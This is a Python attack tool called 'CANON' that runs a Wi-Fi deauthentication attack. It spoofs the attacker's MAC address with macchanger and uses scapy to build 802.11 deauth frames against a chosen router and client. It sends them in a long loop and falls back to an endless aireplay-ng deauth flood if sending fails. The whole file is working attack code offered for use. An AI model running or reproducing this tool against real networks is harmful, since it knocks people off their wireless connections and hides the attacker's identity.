import os,time,sys
from datetime import datetime
from colorama import Fore
from colorama import init,Style
from scapy.all import *
from uuid import getnode as get_mac

init()
#define color
w = Style.BRIGHT+Fore.RESET
g = Style.BRIGHT+Fore.GREEN
b = Style.BRIGHT+Fore.BLUE
r = Style.BRIGHT+Fore.RED
y = Style.BRIGHT+Fore.YELLOW
white = Fore.WHITE
cyan = Style.BRIGHT+Fore.CYAN
#

def gettime():
    n = datetime.now()
    tnow = "%s:%s:%s"%(n.hour,n.minute,n.second)
    return tnow
    
tnow = gettime()
print(white+"\n\n["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Python Version:"+w+" 3.8.2")
print(white+"\n\n["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Required Python Modules:"+w+" colorama,uuid,datetime,scapy")
print(white+"\n\n["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Required Tools:"+w+" aircrack-ng,ifconfig,macchanger\n\n")


if (len(sys.argv) < 5):
	print("\n\n     Usage:"+w+" python3 canon.py"+g+" [ROUTER-BSSID]"+y+" [CLIENT-MAC]"+w+" wlan0 Windows | Linux\n\n")
	quit()

router = sys.argv[1]
client = sys.argv[2]
inter = sys.argv[3]
oper = sys.argv[4]
#operating Systems
operatingSystems = [
	"Windows",
	"windows",
	"Linux",
	"linux"
]
#

if (oper in operatingSystems):
    if (oper == operatingSystems[0] or oper == operatingSystems[1]):
        os.system("cls")
    if (oper == operatingSystems[2] or oper == operatingSystems[3]):
        os.system("clear")
else:
    print("This is not an operating System!")
    quit()

tnow = gettime()
print(r+"                              ---------------------")
print(r+"                             |                     |"+y+" - - - - - - -"+r+" -")
print(r+"                             |   |-----------------")
print(r+"                             |   |")
print(r+"                             |   |")
print(r+"                             |   |")
print(r+"                             |   |")
print(r+"                             |   |-----------------")
print(r+"                             |                     |"+y+" - - - - - - -"+r+" -")
print(r+"                              ---------------------")
print(white+"\n\n                               "+r+"C"+y+" A"+g+" N"+b+" O"+white+" N\n\n")
tnow = gettime()
print(white+" |  ["+r+"CANON"+white+"] "+g+"=> Author: Pulsar")
print(white+" |  ["+r+"CANON"+white+"] "+g+"=> Version 1.0")
print(white+" |  ["+r+"CANON"+white+"] "+g+"=> https://woodnet.000webhostapp.com")
print(white+" |  ["+r+"CANON"+white+"] "+g+"=> https://github.com/woodnet")
print(white+" |  ["+r+"CANON"+white+"] "+g+"=> Creation date:"+b+" 05.07.2020\n\n")
time.sleep(3)
tnow = gettime()
if (router == client):
    print(white+"\n["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+y+"WARNING"+white+"] "+y+"The Client and Router-address is the same. This could be fewer effective..")
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Started Canon")
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Deauthentification Attack.")
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Operating System:"+Style.DIM+white+" %s"%(oper))
time.sleep(1)
time.sleep(1)
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Router BSSID:"+Style.DIM+white+" %s"%(router))
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Client BSSID:"+Style.DIM+white+" %s"%(client))
time.sleep(1)
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Interface:"+Style.DIM+white+" %s"%(inter))
time.sleep(1)
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Using Macchanger for changing MAC.."+w)
try:
    os.system("ifconfig %s down"%(inter))
    os.system("macchanger %s -r"%(inter))
    os.system("ifconfig %s up"%(inter))
except:
    print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+y+"WARNING"+white+"] "+y+"Could not change the MAC!")
    print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+y+"WARNING"+white+"] "+y+"Continuing with real MAC..")
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Creating Package..")
packet = (RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=router, addr3=router) / Dot11Deauth(reason=7))
mac = get_mac()
time.sleep(1)
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Own MAC-Address: "+Style.DIM+white+" %s"%(mac))
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Generated Packet")
time.sleep(1)
tnow = gettime()
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Using Code"+white+" 7")
print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Attacking Target..\n\n")
x = 0
f = 0
yet = True
press = input(white+"Press Enter to Attack=> ")
maximum = 10000000
while (x < maximum):
    try:
        sendp(packet,iface="%s"%(inter),count=1,verbose=False)
        x += 50
        i = x
        tnow = gettime()
        sys.stdout.write(white+"\r["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"]"+g+" Sent Deauthpackages: %i/%s"%(i,maximum))
        sys.stdout.flush()
    except:
        print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+y+"WARNING"+white+"] "+y+"Could not send Packet!")
        f += 1
        if (f == 10):
                tnow = gettime()
                print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+r+"CRITICAL"+white+"] "+y+"To many errors!")
                yet = False 
                break
if (yet == False):
    tnow = gettime()
    print(white+"["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Continuing with"+white+" Aireplay-ng")
    time.sleep(6)
    while True:
        os.system("aireplay-ng --deauth 6000000 -a %s -c %s %s"%(router,client,inter))
time.sleep(2)
tnow = gettime()
print(white+"\n\n["+cyan+"%s"%(tnow)+white+"]"+white+"   ["+g+"INFO"+white+"] "+g+"Stopped Attack.")
print("                              ---------------------")
print("                             |                     |")
print("                             |   |-----------------")
print("                             |   |")
print("                             |   |")
print("                             |   |")
print("                             |   |")
print("                             |   |-----------------")
print("                             |                     |")
print("                              ---------------------")